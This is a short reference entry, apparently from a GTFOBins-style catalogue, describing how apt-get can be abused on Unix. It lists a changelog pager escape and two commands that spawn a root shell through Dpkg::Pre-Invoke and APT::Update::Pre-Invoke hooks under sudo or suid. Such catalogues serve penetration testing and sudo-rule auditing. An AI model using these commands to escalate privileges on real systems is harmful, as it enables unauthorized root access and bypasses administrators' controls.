---
type: gtfobin
name: apt-get
platform: Unix
functions: [inherit, shell]
tags: [gtfobin, unix, lotl]
---

# apt-get

## inherit

```bash
apt-get changelog apt
```
**Contexts:** sudo, unprivileged

## shell

```bash
echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' >/path/to/temp-file
apt-get -y install -c /path/to/temp-file sl
```
_For this to work the target package (i.e., `sl`) must not be already installed._
**Contexts:** sudo, suid

```bash
apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```
_When the shell exits the `update` command is actually executed._
**Contexts:** sudo, suid
